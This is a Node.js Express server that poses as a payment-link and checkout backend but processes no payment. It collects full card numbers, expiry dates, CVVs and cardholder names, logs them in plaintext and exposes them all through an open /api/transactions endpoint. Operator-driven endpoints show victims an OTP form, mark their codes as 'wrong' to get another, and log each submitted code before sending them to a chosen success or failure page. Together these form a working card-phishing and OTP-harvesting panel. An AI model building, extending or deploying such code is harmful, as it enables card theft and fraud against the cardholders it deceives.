import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
app.use(bodyParser.json());
app.use(cors());
app.use(express.static("."));

const transactions = new Map();
const paymentLinks = new Map();

// Add missing transactions endpoint
app.get('/api/transactions', (req, res) => {
  const txnArray = Array.from(transactions.values());
  res.json(txnArray);
});

// Fixed template string syntax in payment link generation
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    if (!amount || !description) {
      return res.status(400).json({ 
        status: "error", 
        message: "Amount and description are required" 
      });
    }
    const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
    paymentLinks.set(invoiceId, { 
      amount, 
      description, 
      paymentLink, 
      createdAt: new Date().toISOString() 
    });
    console.log("Payment link generated:", paymentLink);
    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error("Error generating payment link:", error);
    res.status(500).json({ 
      status: "error", 
      message: "Failed to generate payment link" 
    });
  }
});

// Enhanced error handling for payment processing
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
    
    // Validate required fields
    if (!cardNumber || !expiry || !cvv || !email || !amount || !currency || !cardholder) {
      return res.status(400).json({ 
        status: "error", 
        message: "All fields are required" 
      });
    }

    const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency,
      cardholder,
      status: 'processing',
      otp: null,
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      timestamp: new Date().toLocaleString()
    };
    transactions.set(invoiceId, transaction);
    console.log("New transaction recorded:", transaction);
    res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error("Error processing payment:", error);
    res.status(500).json({ 
      status: "error", 
      message: "Error processing payment. Please try again." 
    });
  }
});

app.post('/api/showOTP', (req, res) => {
  try {
    const { invoiceId } = req.body;
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ 
        status: "error", 
        message: "Transaction not found" 
      });
    }
    txn.otpShown = true;
    txn.status = 'otp_pending';
    txn.otpError = false;
    res.json({ status: "success", message: "OTP form will be shown to user" });
  } catch (error) {
    res.status(500).json({ 
      status: "error", 
      message: "Failed to show OTP" 
    });
  }
});

app.post('/api/wrongOTP', (req, res) => {
  try {
    const { invoiceId } = req.body;
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ 
        status: "error", 
        message: "Transaction not found" 
      });
    }
    txn.otpError = true;
    txn.status = 'otp_pending';
    res.json({ status: "success", message: "OTP marked as wrong" });
  } catch (error) {
    res.status(500).json({ 
      status: "error", 
      message: "Failed to mark OTP as wrong" 
    });
  }
});

app.get('/api/checkTransactionStatus', (req, res) => {
  try {
    const { invoiceId } = req.query;
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ 
        status: "error", 
        message: "Transaction details not found" 
      });
    }
    if (txn.status === 'otp_pending' && txn.otpShown) {
      return res.json({ 
        status: "show_otp", 
        message: "Show OTP form to user", 
        otpError: txn.otpError 
      });
    }
    if (txn.redirectStatus) {
      const redirectUrl = txn.redirectStatus === 'success'
        ? `/success.html?invoiceId=${invoiceId}`
        : `/fail.html?invoiceId=${invoiceId}`;
      return res.json({ status: "redirect", redirectUrl });
    }
    res.json({ status: txn.status, otpError: txn.otpError });
  } catch (error) {
    res.status(500).json({ 
      status: "error", 
      message: "Failed to check transaction status" 
    });
  }
});

app.post('/api/submitOTP', (req, res) => {
  try {
    const { invoiceId, otp } = req.body;
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ 
        status: "error", 
        message: "Transaction not found" 
      });
    }
    txn.otpEntered = otp;
    txn.status = 'otp_received';
    txn.otpError = false;
    console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
    res.json({ status: "success", message: "OTP received" });
  } catch (error) {
    res.status(500).json({ 
      status: "error", 
      message: "Failed to submit OTP" 
    });
  }
});

app.post('/api/updateRedirectStatus', (req, res) => {
  try {
    const { invoiceId, redirectStatus } = req.body;
    const txn = transactions.get(invoiceId);
    if (!txn) {
      return res.status(404).json({ 
        status: "error", 
        message: "Transaction not found" 
      });
    }
    txn.redirectStatus = redirectStatus;
    console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
    res.json({
      status: "success",
      invoiceId,
      redirectStatus,
      redirectUrl: redirectStatus === 'success'
        ? `/success.html?invoiceId=${invoiceId}`
        : `/fail.html?invoiceId=${invoiceId}`
    });
  } catch (error) {
    res.status(500).json({ 
      status: "error", 
      message: "Failed to update redirect status" 
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
